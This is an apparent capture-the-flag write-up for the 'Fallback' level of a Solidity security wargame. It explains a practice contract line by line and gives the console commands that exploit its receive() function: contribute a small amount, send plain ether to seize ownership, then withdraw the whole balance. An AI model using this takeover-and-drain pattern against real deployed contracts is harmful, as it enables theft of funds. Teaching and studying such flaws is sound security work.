# Fallback

In this level, we will need to analyse carefully a smart contract and then find a way to hack it.

We will beat this level if we:

1. Claim ownership of the contract.
2. Reduce its balance to 0.

## Contract's Code Breakdown

[The Smart Contract's Code can be seen here.](Fallback.sol)

```solidity
mapping(address => uint) public contributions;
address public owner;
```

This smart contract has 2 public variables:

- contributions: a mapping to store each contributor's address and the amount contributed.
- owner: variable to store the address of the owner.

```solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }
```

The constructor here simply sets the owner to the deployer's adress and sets its contribution to 1000 ethers.

```solidity
 modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }
```

the onlyOwner modifier checks if the caller is indeed the owner, if not the transaction will revert with the message "caller is not the owner".

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
This is the function to call if we want to make a contributions, this method only accepts contributions of 0.001 ethers and lower, if the caller has more contributions than the owner ( the initial 1000 ethers ) ownership will be transferred to the caller.
**We can see here that if we want to take ownership that way it will require us to send more than 1000 ethers to the contract in more than a million transactions.**

```solidity
function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }
```

This method simply returns the amount contributed by the caller.

```solidity
  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }
```

This method transfers all contract's balance to the owner, it has the onlyOwner modifier which means it is only called by the owner.

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

`receive()` is a special function in solidity, it is executed on contract call with empty calldata or plain ether transfers (via `.send()` or `.transfer()`).
It was added after the 0.6 version to separate between the 2 former uses of the `fallback` function :
* receiving ether and no data.
* receiving data and the function called is not found.

Now receive serves the first purpose.It has no **"function"** keyword like other functions, it cannot have arguments and cannot return anything and must have external visibility and payable state mutability.

Now when reading the receive function, we notice that we can get ownership of the contract just by invoking receive() (sending some plain ether) and having contributed before.

Let's start contributing by sending any value less than 0.001 ether (10<sup>^15</sup> wei):

```javascript
>  await contract.contribute({value: 100}) // calling contribute function with a value of 100 wei
```
After confirming the transaction and waiting for it to be mined let's make sure if we did contribute or no by calling the getContribution():
```javascript
>  (await contract.getContribution()).toString()
<· "100"
```
Now let's invoke the receive function by sending some plain ether with **[web3.eth.sendTransaction()](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#sendtransaction)** :

```javascript
>  await contract.sendTransaction({value: 100})
```

Now we should be the owner of the smart contract, let's call withdraw() and thus reducing the contract's balance to 0 then submit the instance:

```javascript
>  await contract.withdraw()
```

### ***Congratulations, You now know the basics of how ether goes in and out of contracts, including the usage of the fallback method.***